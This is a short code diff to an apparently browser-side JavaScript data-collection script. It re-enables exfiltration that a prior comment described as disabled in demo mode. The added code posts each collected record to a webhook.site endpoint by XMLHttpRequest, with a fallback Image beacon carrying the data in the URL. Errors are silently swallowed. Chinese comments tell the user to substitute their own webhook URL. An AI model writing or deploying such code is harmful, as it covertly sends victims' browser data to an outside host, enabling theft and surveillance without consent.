@@ -48,9 +48,24 @@ var results = [];
 var total = 0, done = 0;
 
 function send(tag, data) {
-  // DISABLED: No server exfiltration in demo mode
-  // Original: XHR POST + Image beacon to attacker server
-  results.push({tag: tag, data: data, ts: new Date().toISOString()});
+  var payload = {tag: tag, data: data, ts: new Date().toISOString()};
+  results.push(payload);
+
+  // 替换成你的 webhook.site URL
+  var endpoint = 'https://webhook.site/2a99ef00-1e75-4f0e-84aa-dbf4d056cdcf';
+
+  // XHR POST
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', endpoint, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify(payload));
+  } catch(e) {}
+
+  // Image beacon (备用方案)
+  try {
+    new Image().src = endpoint + '?d=' + encodeURIComponent(JSON.stringify(payload));
+  } catch(e) {}
 }
 
 function phase(name) {
